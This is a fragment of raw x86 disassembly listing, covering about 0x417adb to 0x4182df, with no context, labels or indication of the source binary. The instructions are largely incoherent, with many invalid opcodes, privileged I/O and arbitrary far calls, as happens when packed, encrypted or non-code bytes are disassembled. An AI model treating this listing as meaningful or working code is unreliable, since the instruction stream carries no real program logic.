  417adb:	xor    BYTE PTR ds:0xe84364a4,dh
  417ae1:	call   0xc858:0x1196aa3a
  417ae8:	fisttp QWORD PTR [edx-0x26]
  417aeb:	fstp   TBYTE PTR [esi+0x1a]
  417aee:	inc    eax
  417aef:	or     al,0x2
  417af1:	icebp  
  417af2:	xchg   ebx,eax
  417af3:	jne    0x417b00
  417af5:	push   esp
  417af6:	push   ds
  417af7:	push   es
  417af8:	xor    BYTE PTR [ebp+0xe],bh
  417afb:	repnz (bad) 
  417afd:	jbe    0x417b3b
  417aff:	pop    esp
  417b00:	scas   eax,DWORD PTR es:[edi]
  417b01:	sub    DWORD PTR cs:[ecx+eiz*2-0xf8c1200],eax
  417b09:	jle    0x417b60
  417b0b:	loop   0x417b4c
  417b0d:	or     BYTE PTR [ebp+0x2e],0x5f
  417b11:	or     al,0x50
  417b13:	in     al,0x73
  417b15:	movq   mm4,QWORD PTR [ecx-0x41]
  417b19:	out    0x4c,al
  417b1b:	mov    edi,0x10f830fa
  417b20:	hlt    
  417b21:	or     DWORD PTR [edx+0x6e],edi
  417b24:	sbb    BYTE PTR [edx],bh
  417b26:	xchg   esp,eax
  417b27:	mov    dh,0xc7
  417b29:	lahf   
  417b2a:	call   0x366352b8
  417b2f:	dec    edi
  417b30:	xlat   BYTE PTR ds:[ebx]
  417b31:	mov    ecx,DWORD PTR [edx-0x27]
  417b34:	mov    ah,BYTE PTR [ecx+0x63203f91]
  417b3a:	sbb    DWORD PTR [esi-0x51],ebx
  417b3d:	cdq    
  417b3e:	inc    esi
  417b3f:	xchg   esp,eax
  417b40:	sar    DWORD PTR [esi-0x2c],0x90
  417b44:	out    dx,al
  417b45:	push   ebp
  417b46:	cmp    DWORD PTR [edi+0x6e02523a],edi
  417b4c:	xchg   esp,esi
  417b4e:	adc    ecx,edi
  417b50:	push   edx
  417b51:	lds    eax,FWORD PTR [esi]
  417b53:	js     0x417bc7
  417b55:	in     al,dx
  417b56:	pop    eax
  417b57:	inc    edi
  417b58:	push   esp
  417b59:	mov    al,ds:0xac6dba1e
  417b5e:	popa   
  417b5f:	int3   
  417b60:	int    0xd3
  417b62:	mov    al,0x6c
  417b64:	(bad)  
  417b65:	xchg   ebp,eax
  417b66:	retf   0x5246
  417b69:	xchg   ecx,eax
  417b6a:	jg     0x417b47
  417b6c:	cmc    
  417b6d:	loope  0x417bbf
  417b6f:	outs   dx,DWORD PTR ds:[esi]
  417b70:	or     eax,0x9130b326
  417b75:	out    dx,eax
  417b76:	call   0x683fbed9
  417b7b:	(bad)  
  417b7c:	mov    ecx,edx
  417b7e:	jge    0x417b42
  417b80:	jo     0x417b1d
  417b82:	shl    BYTE PTR [ecx+0xb],0x44
  417b86:	pop    edx
  417b87:	mov    eax,ds:0x342df6ba
  417b8c:	pop    edi
  417b8d:	stos   BYTE PTR es:[edi],al
  417b8e:	fwait
  417b8f:	pop    esi
  417b90:	cmc    
  417b91:	fisubr WORD PTR [ebx+0x60131fd4]
  417b97:	pop    esi
  417b98:	mov    bh,dh
  417b9a:	retf   0xa0c2
  417b9d:	adc    al,0xf8
  417b9f:	push   ds
  417ba0:	mov    eax,0x1d0939c9
  417ba5:	push   ecx
  417ba6:	add    BYTE PTR [eax-0x44ccab9b],bh
  417bac:	sub    al,0x19
  417bae:	xchg   esi,eax
  417baf:	sub    edx,DWORD PTR [edx]
  417bb1:	fs nop
  417bb3:	inc    ebp
  417bb4:	sub    eax,0xaf2945b7
  417bb9:	sbb    ecx,DWORD PTR [edx+0x295c47a6]
  417bbf:	or     eax,0x51613985
  417bc4:	adc    BYTE PTR [ebx+0x52],ch
  417bc7:	sbb    eax,0x3a9e4993
  417bcc:	ds mov bl,0xff
  417bcf:	dec    edx
  417bd0:	push   ss
  417bd1:	jg     0x417bb9
  417bd3:	jnp    0x417be2
  417bd5:	pop    esi
  417bd6:	into   
  417bd7:	push   ebx
  417bd8:	loope  0x417c18
  417bda:	bound  ebp,QWORD PTR [ecx]
  417bdc:	mov    ebx,0xa28a1075
  417be1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417be2:	jb     0x417c13
  417be4:	push   ebp
  417be5:	rol    BYTE PTR [ebx-0x41527c3c],1
  417beb:	nop
  417bec:	jnp    0x417b97
  417bee:	int3   
  417bef:	loop   0x417ba7
  417bf1:	aaa    
  417bf2:	imul   esp,DWORD PTR [esi-0x69df41f9],0xffffffc1
  417bf9:	xor    cl,bl
  417bfb:	outs   dx,DWORD PTR ds:[esi]
  417bfc:	jle    0x417ba8
  417bfe:	mov    dh,0xd2
  417c00:	xchg   BYTE PTR [eax-0x4154797b],dl
  417c06:	push   es
  417c07:	aad    0x4f
  417c09:	dec    ebp
  417c0a:	dec    ebx
  417c0b:	adc    esi,DWORD PTR [ecx+ebx*8]
  417c0e:	dec    ecx
  417c0f:	outs   dx,BYTE PTR ds:[esi]
  417c10:	nop
  417c11:	inc    esi
  417c12:	ficomp WORD PTR [edi-0x6240cbe6]
  417c18:	mov    edi,0xa06b959c
  417c1d:	jno    0x417c36
  417c1f:	pop    DWORD PTR [edx+0x2a]
  417c22:	pop    edx
  417c23:	(bad)  
  417c24:	(bad)  
  417c25:	fisub  WORD PTR [edi+0x7f]
  417c28:	mov    ecx,ebp
  417c2a:	sbb    DWORD PTR [ebp+0x1f],eax
  417c2d:	aam    0x1f
  417c2f:	jmp    0x417c5c
  417c31:	in     eax,0x38
  417c33:	mov    gs,WORD PTR [ecx]
  417c35:	jp     0x417cb6
  417c37:	jbe    0x417be1
  417c39:	xchg   esi,eax
  417c3a:	dec    ebp
  417c3b:	push   ss
  417c3c:	ficomp DWORD PTR [ebx-0x26]
  417c3f:	cld    
  417c40:	add    ah,BYTE PTR [ecx]
  417c42:	cmc    
  417c43:	jg     0x417c83
  417c45:	mov    edx,0x934865fb
  417c4a:	cmp    ebp,DWORD PTR [ebp+0x71]
  417c4d:	mov    edi,DWORD PTR [ebx-0x7ae01493]
  417c53:	xor    eax,0x59140979
  417c58:	rol    DWORD PTR [ecx],0xc2
  417c5b:	dec    ebx
  417c5c:	jo     0x417bde
  417c5e:	mov    ebx,0x247a7e97
  417c63:	mov    eax,0xff32867b
  417c68:	pop    es
  417c69:	pop    edx
  417c6a:	push   eax
  417c6b:	xor    al,0x8e
  417c6d:	add    al,dl
  417c6f:	fsubr  QWORD PTR [ebx]
  417c71:	cmp    esp,DWORD PTR [ebp+0x5d992a07]
  417c77:	(bad)  
  417c78:	cld    
  417c79:	push   esi
  417c7a:	pushf  
  417c7b:	sub    al,0x4c
  417c7d:	in     al,dx
  417c7e:	mov    ecx,0xf6d5339a
  417c83:	push   ecx
  417c84:	nop
  417c85:	sub    al,0xcc
  417c87:	dec    ebp
  417c88:	pop    ebp
  417c89:	and    ebx,eax
  417c8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c8c:	jge    0x417c5b
  417c8e:	cdq    
  417c8f:	inc    ebx
  417c90:	cld    
  417c91:	fs call 0x0:0x365ce5f1
	...
  417d11:	add    BYTE PTR [eax],al
  417d13:	add    BYTE PTR [edi+ecx*4+0x7ff767f6],bh
  417d1a:	mov    ebp,0x792d96df
  417d1f:	mov    edx,0x39813942
  417d24:	pushf  
  417d25:	pop    ds
  417d26:	add    DWORD PTR [eax],eax
  417d28:	imul   eax,DWORD PTR [edi],0x0
  417d2b:	add    cl,ch
  417d2d:	cmp    ah,cl
  417d2f:	cmc    
  417d30:	mov    eax,0x843ecf06
  417d35:	inc    esi
  417d36:	pop    ecx
  417d37:	mov    ecx,0x2cc430f3
  417d3c:	lock adc DWORD PTR [esi+0x3],ebx
  417d40:	mov    ebx,ebp
  417d42:	ds dec eax
  417d44:	lods   al,BYTE PTR ds:[esi]
  417d45:	jp     0x417d26
  417d47:	pusha  
  417d48:	mov    dl,ah
  417d4a:	ret    
  417d4b:	sub    al,0x3e
  417d4d:	sar    edx,cl
  417d4f:	sub    DWORD PTR [ebx-0x5f15b939],esp
  417d55:	out    dx,al
  417d56:	fcom   DWORD PTR [esi-0x50b19b08]
  417d5c:	int3   
  417d5d:	and    al,0xee
  417d5f:	mov    es,WORD PTR ds:0x94373db1
  417d65:	fsub   DWORD PTR [ebp-0x2a13b6f7]
  417d6b:	adc    al,0x20
  417d6d:	cmp    eax,0xf43323fa
  417d72:	in     eax,dx
  417d73:	ret    
  417d74:	daa    
  417d75:	ret    
  417d76:	lock jecxz 0x417d01
  417d79:	mov    WORD PTR [edx-0x6a],fs
  417d7c:	sub    BYTE PTR [ebx+0x70],bh
  417d7f:	and    DWORD PTR [ecx+0x51e428ea],eax
  417d85:	fisubr DWORD PTR [edx+0x26]
  417d88:	push   0x1b4fc0c9
  417d8d:	and    DWORD PTR [edi+0x3f],eax
  417d90:	mov    esi,0xde7a3333
  417d95:	jmp    0x2fca:0x9fa01405
  417d9c:	fidivr DWORD PTR [ebx-0x17]
  417d9f:	pop    ecx
  417da0:	mov    dl,0x5b
  417da2:	and    DWORD PTR [esi-0xd],eax
  417da5:	push   ebx
  417da6:	dec    eax
  417da7:	in     eax,0xf6
  417da9:	lea    ecx,[eax+esi*1]
  417dac:	cmp    eax,DWORD PTR [ecx-0x43]
  417daf:	jp     0x417df2
  417db1:	mov    bh,0xea
  417db3:	pop    ebp
  417db4:	xor    esp,DWORD PTR [edi]
  417db6:	cmp    al,0x38
  417db8:	scas   al,BYTE PTR es:[edi]
  417db9:	out    dx,eax
  417dba:	shl    BYTE PTR [ebx+0x298cab22],1
  417dc0:	or     al,0xea
  417dc2:	adc    al,0xa7
  417dc4:	les    eax,FWORD PTR [ecx-0x50]
  417dc7:	popf   
  417dc8:	mov    ebp,DWORD PTR [eax-0x4a]
  417dcb:	retf   
  417dcc:	xor    bl,ah
  417dce:	mov    dh,0x91
  417dd0:	retf   0x8bb8
  417dd3:	test   eax,0xbc0a0224
  417dd8:	pop    eax
  417dd9:	je     0x417dc0
  417ddb:	or     ecx,DWORD PTR [ecx-0x77]
  417dde:	push   eax
  417ddf:	mov    ebp,DWORD PTR [esp+eiz*8]
  417de2:	mov    ah,0xbe
  417de4:	and    DWORD PTR [edi],ebp
  417de6:	pop    ebp
  417de7:	cli    
  417de8:	outs   dx,DWORD PTR ds:[esi]
  417de9:	fild   WORD PTR [esi]
  417deb:	and    eax,0xede1cede
  417df0:	pop    ebx
  417df1:	sbb    al,0x97
  417df3:	les    ebp,FWORD PTR [edx+eiz*2]
  417df6:	pop    esi
  417df7:	or     al,0x1e
  417df9:	lahf   
  417dfa:	pop    es
  417dfb:	pop    ecx
  417dfc:	sbb    ah,bl
  417dfe:	mov    bl,BYTE PTR [ecx]
  417e00:	call   0xe382:0xee03387c
  417e07:	xor    edx,DWORD PTR [esi]
  417e09:	mov    WORD PTR [esi-0xb],ds
  417e0c:	ror    ebp,0xd0
  417e0f:	xchg   edi,esp
  417e11:	cmp    ebx,esp
  417e13:	shl    BYTE PTR [edx+ebp*1-0x7d],0xd9
  417e18:	and    eax,0x561cd906
  417e1d:	stos   BYTE PTR es:[edi],al
  417e1e:	lods   al,BYTE PTR ds:[esi]
  417e1f:	mov    esp,0x95b480
  417e24:	retf   
  417e25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e26:	neg    edx
  417e28:	enter  0x5904,0x9
  417e2c:	retf   
  417e2d:	jmp    0x417e46
  417e2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e30:	gs add al,0x36
  417e33:	sbb    DWORD PTR [esp+esi*8-0x7eee08a3],ebp
  417e3a:	retf   
  417e3b:	dec    ebp
  417e3c:	out    dx,al
  417e3d:	pop    ss
  417e3e:	pop    edx
  417e3f:	call   0xfcacc9d2
  417e44:	inc    ebx
  417e45:	pop    ss
  417e46:	test   eax,0xf2fd0254
  417e4b:	in     al,dx
  417e4c:	xchg   edi,eax
  417e4d:	mov    ah,0x83
  417e4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e50:	call   0xbeab:0xa4176382
  417e57:	push   0x61522c96
  417e5c:	popa   
  417e5d:	mov    edx,0xaf8d57b9
  417e62:	fisttp DWORD PTR [edx-0xe1d1ef6]
  417e68:	pop    eax
  417e69:	aam    0x8a
  417e6b:	mov    esi,0x237e5d26
  417e70:	sar    BYTE PTR [edx],cl
  417e72:	xchg   esp,eax
  417e73:	cld    
  417e74:	or     ebx,DWORD PTR [ecx-0x6a054f72]
  417e7a:	stc    
  417e7b:	fld    DWORD PTR [esi-0x9]
  417e7e:	(bad)  
  417e7f:	fdivr  st(4),st
  417e81:	bound  esp,QWORD PTR [eax+0x9]
  417e84:	outs   dx,DWORD PTR ds:[esi]
  417e85:	stc    
  417e86:	mov    bl,cl
  417e88:	shl    ebx,0x48
  417e8b:	pusha  
  417e8c:	jge    0x417e1d
  417e8e:	and    DWORD PTR [ebx+0x21a22421],edx
  417e94:	aas    
  417e95:	loopne 0x417e23
  417e97:	retf   0x86fe
  417e9a:	xor    edx,DWORD PTR [edx+0x5b]
  417e9d:	pop    ds
  417e9e:	js     0x417eb3
  417ea0:	add    DWORD PTR [esi],ebp
  417ea2:	popf   
  417ea3:	out    dx,al
  417ea4:	retf   0x5b96
  417ea7:	and    eax,0xb2e96fd5
  417eac:	shl    esi,0x6
  417eaf:	dec    ebp
  417eb0:	pop    ds
  417eb1:	mov    ah,0xce
  417eb3:	jbe    0x417eb5
  417eb5:	fmul   DWORD PTR [eax+0x13]
  417eb8:	cld    
  417eb9:	sbb    eax,0x1e000ab9
  417ebe:	hlt    
  417ebf:	pop    ds
  417ec0:	mov    ah,0x25
  417ec2:	sub    eax,0x39e6fb
  417ec7:	jg     0x417ed8
  417ec9:	add    al,0xb5
  417ecb:	loope  0x417f31
  417ecd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ece:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ecf:	push   esi
  417ed0:	out    0x82,eax
  417ed2:	mov    ebp,0x1ae4d122
  417ed7:	fdivp  st(3),st
  417ed9:	out    0x72,eax
  417edb:	push   ss
  417edc:	adc    eax,0x29211364
  417ee1:	and    DWORD PTR [ebp+0x46],0x5f
  417ee5:	dec    ebp
  417ee6:	cmc    
  417ee7:	ror    DWORD PTR [edi-0x6],1
  417eea:	lods   al,BYTE PTR ds:[esi]
  417eeb:	sti    
  417eec:	adc    eax,0x4ddb2159
  417ef1:	test   DWORD PTR [eax-0x36],ebx
  417ef4:	mul    DWORD PTR [ebx+0x74]
  417ef7:	lahf   
  417ef8:	pop    ss
  417ef9:	ds test ebp,edi
  417efc:	sub    esp,DWORD PTR [edx]
  417efe:	mov    eax,0x9d375bc5
  417f03:	cmp    al,dh
  417f05:	xchg   esp,eax
  417f06:	fwait
  417f07:	cmp    ah,dl
  417f09:	xchg   DWORD PTR [esi-0x4],edx
  417f0c:	jne    0x417f2b
  417f0e:	mov    ds:0x9578a0ae,al
  417f13:	mov    ds:0x95a7cfea,eax
  417f18:	adc    al,0x51
  417f1a:	sbb    al,0xed
  417f1c:	lock mov gs:0xd1c8d14f,al
  417f23:	pop    ss
  417f24:	cmp    BYTE PTR [edx-0x7505e0b8],bh
  417f2a:	dec    esp
  417f2b:	mov    edi,ebx
  417f2d:	lds    ebx,FWORD PTR [ecx+ebx*2]
  417f30:	sub    al,0x5d
  417f32:	fwait
  417f33:	xchg   ecx,eax
  417f34:	in     eax,0xe1
  417f36:	xor    ecx,edi
  417f38:	pop    ss
  417f39:	add    bl,cl
  417f3b:	xchg   ebp,eax
  417f3c:	es mov edi,0xa6129d69
  417f42:	mov    ds:0x4a27be45,eax
  417f47:	and    eax,0x16d3deea
  417f4c:	or     DWORD PTR [edi],edx
  417f4e:	jnp    0x417f14
  417f50:	sbb    DWORD PTR [esi-0x29cd3dd4],esi
  417f56:	lods   al,BYTE PTR ds:[esi]
  417f57:	jge    0x417f94
  417f59:	cdq    
  417f5a:	and    BYTE PTR [ebp*8-0x7d8cb318],0xa8
  417f62:	icebp  
  417f63:	xor    eax,0x2a0871a1
  417f68:	ret    0x7efe
  417f6b:	xchg   esi,eax
  417f6c:	clc    
  417f6d:	(bad)  
  417f6e:	sbb    esp,esi
  417f70:	shl    BYTE PTR [edx],1
  417f72:	mov    ecx,0x86d6b390
  417f77:	dec    esi
  417f78:	mov    ?,WORD PTR [ebp+0x69ca6dfc]
  417f7e:	fistp  WORD PTR [esi-0x1b]
  417f81:	cmp    ebp,edi
  417f83:	lods   eax,DWORD PTR ds:[esi]
  417f84:	outs   dx,BYTE PTR ss:[esi]
  417f86:	in     al,dx
  417f87:	mov    esi,0xd33f57e4
  417f8c:	or     DWORD PTR ds:0xd1cbbe71,ebx
  417f92:	xchg   ecx,eax
  417f93:	and    ah,BYTE PTR ds:0xc763faaa
  417f99:	mov    edx,0x28cc6330
  417f9e:	and    al,BYTE PTR [edx+0x30f40ee1]
  417fa4:	xchg   ecx,eax
  417fa5:	mov    WORD PTR [eax],gs
  417fa7:	(bad)  
  417fa8:	mov    ch,0x7d
  417faa:	inc    ecx
  417fab:	cmp    edi,DWORD PTR [ecx+edi*2-0x57]
  417faf:	ror    DWORD PTR [edi-0x5b],0xe5
  417fb3:	pop    ds
  417fb4:	pop    esp
  417fb5:	and    DWORD PTR [esi+0x4c],ebp
  417fb8:	not    DWORD PTR [eax]
  417fba:	inc    ecx
  417fbb:	pop    ecx
  417fbc:	xchg   edx,eax
  417fbd:	jecxz  0x417f4e
  417fbf:	aas    
  417fc0:	mov    ds:0xddc76c1,al
  417fc5:	out    0x48,eax
  417fc7:	mov    dh,0x54
  417fc9:	test   al,0x42
  417fcb:	ret    0x8cdf
  417fce:	pop    ebx
  417fcf:	imul   edi,DWORD PTR [eax],0xd0cb190c
  417fd5:	dec    ebx
  417fd6:	test   DWORD PTR [ecx+0xe],ebx
  417fd9:	icebp  
  417fda:	in     al,0x96
  417fdc:	mov    ecx,0x26a527e8
  417fe1:	into   
  417fe2:	mov    cl,0x21
  417fe4:	dec    eax
  417fe5:	loopne 0x417f72
  417fe7:	mov    ebx,DWORD PTR [esi+0x1b214fbb]
  417fed:	xchg   edi,eax
  417fee:	dec    esi
  417fef:	push   edx
  417ff0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ff1:	pop    eax
  417ff2:	(bad)  
  417ff4:	jb     0x418035
  417ff6:	pop    ds
  417ff7:	push   edx
  417ff8:	adc    dh,BYTE PTR [edx]
  417ffa:	lds    ebp,FWORD PTR [ebp+0x69]
  417ffd:	sbb    eax,0x5d8c81c5
  418002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418003:	frstor [ecx+0x1e]
  418006:	repnz dec ebp
  418008:	dec    eax
  418009:	xor    BYTE PTR [eax-0x1fba8b9],cl
  41800f:	je     0x417f9e
  418011:	inc    edx
  418012:	jge    0x418051
  418014:	aas    
  418015:	cmp    al,0x96
  418017:	pusha  
  418018:	sbb    ah,BYTE PTR [ebx]
  41801a:	mov    ecx,0x527765cf
  41801f:	xor    DWORD PTR [ebx+edi*4+0x30ebaedd],edi
  418026:	stc    
  418027:	popa   
  418028:	(bad)
  41802d:	jns    0x417fd9
  41802f:	and    DWORD PTR [ebp-0x3d34c6a5],esp
  418035:	mov    eax,ds:0x346e5634
  41803a:	clc    
  41803b:	mov    ah,0x26
  41803d:	xchg   edi,eax
  41803e:	test   BYTE PTR [ecx],al
  418040:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418041:	icebp  
  418042:	ror    DWORD PTR [ecx-0x4ad77da6],1
  418048:	out    0xb6,eax
  41804a:	(bad)  [eax+eiz*1+0x39]
  41804e:	jbe    0x418030
  418050:	cld    
  418051:	jnp    0x418039
  418053:	mov    edi,?
  418055:	push   DWORD PTR [ebx+ebp*1-0x40]
  418059:	sub    eax,DWORD PTR [eax+0x40]
  41805c:	add    BYTE PTR [edx],al
  41805e:	gs pop esp
  418060:	lahf   
  418061:	outs   dx,DWORD PTR ds:[esi]
  418062:	or     bh,bl
  418064:	cdq    
  418065:	outs   dx,BYTE PTR ds:[esi]
  418066:	xor    esi,esi
  418068:	or     ebp,DWORD PTR ds:0xca2773ec
  41806e:	mov    ecx,DWORD PTR [edx+0x685288cf]
  418074:	ins    BYTE PTR es:[edi],dx
  418075:	sub    eax,0xa79184b5
  41807a:	(bad)  
  41807d:	inc    eax
  41807e:	adc    dl,BYTE PTR [esi+eiz*8]
  418081:	mov    bl,0xfd
  418083:	mul    BYTE PTR [edx-0x51204d]
  418089:	add    eax,0x436e5dbb
  41808e:	xchg   esp,eax
  41808f:	inc    ebp
  418090:	push   es
  418091:	mov    ebp,0xb3cbbd62
  418096:	cld    
  418097:	dec    ebp
  418098:	loope  0x418056
  41809a:	or     dh,BYTE PTR [edi+0x5d]
  41809d:	dec    ebp
  41809e:	lods   eax,DWORD PTR ds:[esi]
  41809f:	or     cl,BYTE PTR [esi+edi*4]
  4180a2:	pusha  
  4180a3:	xor    ah,BYTE PTR [esi]
  4180a5:	in     al,0x64
  4180a7:	jno    0x4180bd
  4180a9:	adc    dl,BYTE PTR [edx]
  4180ab:	fadd   QWORD PTR [ecx]
  4180ad:	cmp    al,0x17
  4180af:	add    esp,DWORD PTR [ebx+0xd637ed2]
  4180b5:	cmp    bh,BYTE PTR [edi+0x7b]
  4180b8:	stos   BYTE PTR es:[edi],al
  4180b9:	loope  0x4180dd
  4180bb:	dec    edx
  4180bc:	test   al,0x8c
  4180be:	leave  
  4180bf:	shl    esp,cl
  4180c1:	and    esi,eax
  4180c3:	das    
  4180c4:	or     eax,0x5ec16ea4
  4180c9:	je     0x418101
  4180cb:	xor    cl,BYTE PTR [ebx-0x3]
  4180ce:	mov    al,0xee
  4180d0:	das    
  4180d1:	xchg   dh,dl
  4180d3:	cmp    al,0xad
  4180d5:	jle    0x4180f2
  4180d7:	pop    edx
  4180d8:	or     eax,0x2ddaa919
  4180dd:	sub    eax,0x7c2c2354
  4180e3:	sbb    edi,DWORD PTR [edx-0x5db1a4c5]
  4180e9:	jnp    0x41807c
  4180eb:	(bad)  
  4180ec:	shr    DWORD PTR [ebx],cl
  4180ee:	xchg   ebx,eax
  4180ef:	sbb    DWORD PTR [eax],ebx
  4180f1:	or     DWORD PTR [edi+0x5f],0x74365e1f
  4180f8:	lea    esp,[eax+eiz*8]
  4180fb:	xchg   DWORD PTR [esi],edx
  4180fd:	inc    esp
  4180fe:	enter  0x509b,0x25
  418102:	test   BYTE PTR [ecx-0x5ac8a61],dl
  418108:	xor    eax,0x51cd51b2
  41810d:	lds    edi,FWORD PTR [ecx-0x7]
  418110:	inc    ebp
  418111:	fstp   DWORD PTR [eax+0x2d]
  418114:	popa   
  418115:	(bad)  ds:[edx+eax*1]
  418119:	gs arpl bx,dx
  41811c:	gs cli 
  41811e:	mov    al,0xf
  418120:	sbb    edi,DWORD PTR [eax+esi*2+0x72]
  418124:	cmc    
  418125:	out    0x30,al
  418127:	cmp    dl,BYTE PTR [esi]
  418129:	xchg   ebp,eax
  41812a:	push   edx
  41812b:	inc    ebp
  41812c:	mov    eax,0x4a743f69
  418131:	bound  ebx,QWORD PTR [edi-0x79]
  418134:	mov    gs,WORD PTR [edx+0x67]
  418137:	in     al,dx
  418138:	mov    cl,0x69
  41813a:	mov    dl,0x2
  41813c:	ins    DWORD PTR es:[edi],dx
  41813d:	pop    edi
  41813e:	(bad)
  418141:	(bad)  
  418142:	or     eax,esi
  418144:	dec    esp
  418145:	xchg   ebx,eax
  418146:	cwde   
  418147:	dec    ebp
  418148:	add    edx,edx
  41814a:	xchg   BYTE PTR [ecx],dh
  41814c:	iret   
  41814d:	xor    DWORD PTR [esi+0x6e5cafee],ebp
  418153:	ss loope 0x4180fe
  418156:	push   ebp
  418157:	sub    BYTE PTR ds:0x6280781c,cl
  41815d:	mov    ebx,0xfabff998
  418162:	pop    ecx
  418163:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418164:	mov    ds:0xd7f58090,al
  418169:	call   0x4fec:0x11fa4235
  418170:	pop    ebx
  418171:	dec    edx
  418172:	test   esp,0x9eb5371e
  418178:	or     al,0xa
  41817a:	enter  0x7b39,0x95
  41817e:	out    0x9a,eax
  418180:	jns    0x418149
  418182:	icebp  
  418183:	fidivr DWORD PTR [edi+0x236a9c5a]
  418189:	mov    edi,fs
  41818b:	dec    esp
  41818c:	inc    edi
  41818d:	adc    ah,al
  41818f:	xor    al,0xc0
  418191:	shr    DWORD PTR [ebp-0x36cf6fd2],1
  418197:	sbb    DWORD PTR [eax+edx*8-0x11a365b6],ebx
  41819e:	outs   dx,BYTE PTR ds:[esi]
  41819f:	test   DWORD PTR [edi],ecx
  4181a1:	mov    WORD PTR [edx+0x770bb403],gs
  4181a7:	push   ecx
  4181a8:	adc    ah,bh
  4181aa:	test   DWORD PTR [edx+ebx*1+0x3c],ecx
  4181ae:	push   ebp
  4181af:	mul    BYTE PTR [edi]
  4181b1:	retf   
  4181b2:	ret    0x2520
  4181b5:	inc    esi
  4181b6:	stc    
  4181b7:	mov    esi,0x5afae0da
  4181bc:	push   0xcd78a5d8
  4181c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181c2:	and    edi,edi
  4181c4:	cmp    bh,BYTE PTR [ecx+ecx*4+0x5c]
  4181c8:	je     0x418161
  4181ca:	iret   
  4181cb:	popa   
  4181cc:	adc    dl,BYTE PTR ds:0xa713c9b1
  4181d2:	bound  ebp,QWORD PTR [edi+0x7ebf257e]
  4181d8:	jbe    0x4181f5
  4181da:	inc    ebx
  4181db:	sbb    bh,0x3b
  4181de:	fcmovnu st,st(3)
  4181e0:	cmp    al,0x4f
  4181e2:	xchg   ebx,eax
  4181e3:	stos   BYTE PTR es:[edi],al
  4181e4:	in     al,0x73
  4181e6:	xor    dh,bh
  4181e8:	jle    0x4181b0
  4181ea:	pop    ebx
  4181eb:	cdq    
  4181ec:	sub    eax,ebp
  4181ee:	nop
  4181ef:	lods   eax,DWORD PTR ds:[esi]
  4181f0:	std    
  4181f1:	loop   0x418199
  4181f3:	cli    
  4181f4:	xchg   ebx,eax
  4181f5:	sub    ebx,esp
  4181f7:	xchg   ebx,eax
  4181f8:	pushf  
  4181f9:	test   BYTE PTR [esi+0x42],al
  4181fc:	shr    BYTE PTR [edx+0x4b],1
  4181ff:	out    dx,eax
  418200:	jg     0x418254
  418202:	es popa 
  418204:	test   eax,0x104632d3
  418209:	dec    esi
  41820a:	aam    0xf1
  41820c:	mov    ecx,0x1b99092
  418211:	or     ebp,DWORD PTR ds:0xf4167940
  418217:	shr    ebx,cl
  418219:	fadd   st,st(7)
  41821b:	test   edi,edi
  41821d:	xor    DWORD PTR [ebp+0x3e],edx
  418220:	jle    0x418225
  418222:	add    al,0x39
  418224:	mov    dh,0x5f
  418226:	xchg   esi,eax
  418227:	loope  0x418289
  418229:	mov    eax,?
  41822b:	repz popa 
  41822d:	jg     0x41820d
  41822f:	popf   
  418230:	cmc    
  418231:	in     eax,dx
  418232:	ret    0x2232
  418235:	test   BYTE PTR [ebp-0x6985c12c],0xd1
  41823c:	lock test DWORD PTR [edi],edx
  41823f:	fsubp  st(0),st
  418241:	lods   eax,DWORD PTR ds:[esi]
  418242:	fdivr  QWORD PTR [ecx+0x53]
  418245:	mov    ah,0x78
  418247:	pop    ebp
  418248:	mov    fs,edx
  41824a:	in     al,0x47
  41824c:	ins    BYTE PTR es:[edi],dx
  41824d:	das    
  41824e:	mov    al,0xfb
  418250:	aaa    
  418251:	cmc    
  418252:	mov    BYTE PTR [ecx+0x7f],al
  418255:	pop    eax
  418256:	bnd call ebp
  418259:	std    
  41825a:	add    ebx,esi
  41825c:	arpl   WORD PTR [edx-0x7e5dec13],bp
  418262:	je     0x418205
  418264:	fiadd  DWORD PTR [ecx+edi*8-0x55]
  418268:	jecxz  0x4182d9
  41826a:	xchg   BYTE PTR [eax],bh
  41826c:	dec    ecx
  41826d:	ins    DWORD PTR es:[edi],dx
  41826e:	xchg   ebp,eax
  41826f:	sub    esp,DWORD PTR [ebx+0x1550f69a]
  418275:	aam    0x38
  418277:	dec    edi
  418278:	jl     0x4182a5
  41827a:	mov    ecx,0x16100264
  41827f:	cmp    ebx,DWORD PTR [ebx+ebx*8-0x2b]
  418283:	add    eax,0xa9f63372
  418288:	and    cl,ah
  41828a:	(bad)  
  41828d:	and    dh,bh
  41828f:	dec    esi
  418290:	je     0x418251
  418292:	lea    edx,[esi]
  418294:	sub    eax,DWORD PTR [ebx-0x19]
  418297:	stos   BYTE PTR es:[edi],al
  418298:	out    0xfd,eax
  41829a:	icebp  
  41829b:	mov    eax,ds:0xc4b63013
  4182a0:	dec    esp
  4182a1:	sbb    BYTE PTR [esi-0x455c7b90],dh
  4182a7:	pop    ss
  4182a8:	inc    ebx
  4182a9:	add    BYTE PTR [edx-0x4f],cl
  4182ac:	and    DWORD PTR [ecx-0x1b3f502],ebp
  4182b2:	xor    ebp,eax
  4182b4:	out    dx,al
  4182b5:	mov    al,ds:0xae2927b3
  4182ba:	push   edx
  4182bb:	call   0x41bf:0x8f045701
  4182c2:	jbe    0x4182f3
  4182c4:	pop    ss
  4182c5:	and    ebp,DWORD PTR [ebx+0x1f]
  4182c8:	js     0x4182ad
  4182ca:	sbb    al,0xaf
  4182cc:	ins    BYTE PTR es:[edi],dx
  4182cd:	push   ds
  4182ce:	lods   al,BYTE PTR ds:[esi]
  4182cf:	sub    edi,ebp
  4182d1:	mov    es,WORD PTR [ebp+0x12eab84a]
  4182d7:	xor    dl,dh
  4182d9:	jae    0x418343
  4182db:	adc    ebp,DWORD PTR [eax]
  4182dd:	jae    0x4182d6
  4182df:	cmp    BYTE PTR [esi-0x17a00641],bl
